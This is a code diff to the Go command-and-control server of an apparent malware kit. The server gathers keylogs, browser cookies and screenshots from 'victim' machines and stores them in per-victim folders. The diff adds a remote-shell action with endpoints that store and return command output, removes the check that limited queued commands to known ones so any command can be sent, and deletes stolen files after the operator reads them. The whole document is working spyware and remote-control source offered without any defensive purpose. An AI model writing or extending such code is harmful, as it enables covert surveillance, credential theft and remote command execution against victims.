@@ -11,7 +11,6 @@ import (
 	"io/ioutil"
 	"net/http"
 	"os"
-	"regexp"
 	"strings"
 	"time"
 )
@@ -41,24 +40,21 @@ const (
 	LazyKeylogAction    = "lazyKeylog"
 	CookieMonsterAction = "cookies"
 	ScreenshotAction    = "screenshot"
+	ShellAction         = "shell"
 	SelfDestructAction  = "self-destruct"
 	StopAction          = "stop-(keylog|lazyKeylog)"
 
-	KeylogFilename     = "keylog.txt"
-	ScreenshotFilename = "ss.png"
-	LazyKeylogFilename = "lazyKeylog.txt"
-	CookiesFilename    = "cookies.txt"
+	KeylogFilename      = "keylog.txt"
+	ScreenshotFilename  = "ss.png"
+	LazyKeylogFilename  = "lazyKeylog.txt"
+	CookiesFilename     = "cookies.txt"
+	ShellOutputFilename = "shell.txt"
 
 	ErrorMessage = "No action"
 	ActionKey    = "action"
 )
 
 var CommandsStack []TextLog
-
-func checkCommand(command string) bool {
-	val, _ := regexp.Match(StopAction, []byte(command))
-	return val || command == KeylogAction || command == LazyKeylogAction || command == SelfDestructAction || command == CookieMonsterAction || command == ScreenshotAction
-}
 
 func main() {
 
@@ -143,13 +139,6 @@ func main() {
 	sv.POST("/appendCommands", func(context *gin.Context) {
 		var command TextLog
 		if err := context.ShouldBindJSON(&command); err == nil {
-			err2 := checkCommand(command.Body)
-			if !err2 {
-				context.JSON(http.StatusNotFound, gin.H{
-					ActionKey: "Command submitted is not a recognized command",
-				})
-				return
-			}
 			CommandsStack = append(CommandsStack, command)
 			context.JSON(http.StatusOK, struct{}{})
 			return
@@ -178,6 +167,33 @@ func main() {
 		var text TextLog
 		if err := c.ShouldBindJSON(&text); err == nil {
 			file, err := os.OpenFile(fmt.Sprintf("victim-%s/%s", text.Log.Victim, CookiesFilename), os.O_APPEND|os.O_CREATE, 0755)
+			defer func(file *os.File) {
+				err := file.Close()
+				if err != nil {
+					c.JSON(http.StatusInternalServerError, nil)
+				}
+			}(file)
+			if err != nil {
+				c.JSON(http.StatusServiceUnavailable, gin.H{
+					ActionKey: "Not an available file",
+				})
+				return
+			}
+			err = LogEntry(file, &text, true)
+			if err != nil {
+				c.JSON(http.StatusBadRequest, gin.H{
+					ActionKey: "cannot append to file",
+				})
+				return
+			}
+		}
+		c.JSON(201, struct{}{})
+	})
+
+	sv.POST("/shell", func(c *gin.Context) {
+		var text TextLog
+		if err := c.ShouldBindJSON(&text); err == nil {
+			file, err := os.OpenFile(fmt.Sprintf("victim-%s/%s", text.Log.Victim, ShellOutputFilename), os.O_APPEND|os.O_CREATE, 0755)
 			defer func(file *os.File) {
 				err := file.Close()
 				if err != nil {
@@ -277,6 +293,10 @@ func main() {
 		GetFileContent(c, KeylogFilename)
 	})
 
+	sv.GET("/shell/:victim", func(c *gin.Context) {
+		GetFileContent(c, ShellOutputFilename)
+	})
+
 	sv.GET("/lazyKeylog/:victim", func(c *gin.Context) {
 		GetFileContent(c, LazyKeylogFilename)
 	})
@@ -291,6 +311,11 @@ func GetFileContent(c *gin.Context, filename string) {
 		return
 	}
 	text, err := getTextFromFilePath(fmt.Sprintf("victim-%s/%s", victim.Victim, filename))
+	if err != nil {
+		c.AbortWithError(http.StatusBadRequest, err)
+		return
+	}
+	err = os.Remove(fmt.Sprintf("victim-%s/%s", victim.Victim, filename))
 	if err != nil {
 		c.AbortWithError(http.StatusBadRequest, err)
 		return
@@ -335,6 +360,9 @@ func getTextFromFilePath(filePath string) (string, error) {
 		rez += string(s)
 		rez += "\n"
 		s, _, e = r.ReadLine()
+	}
+	if err != nil {
+		return "", err
 	}
 	return rez, nil
 }
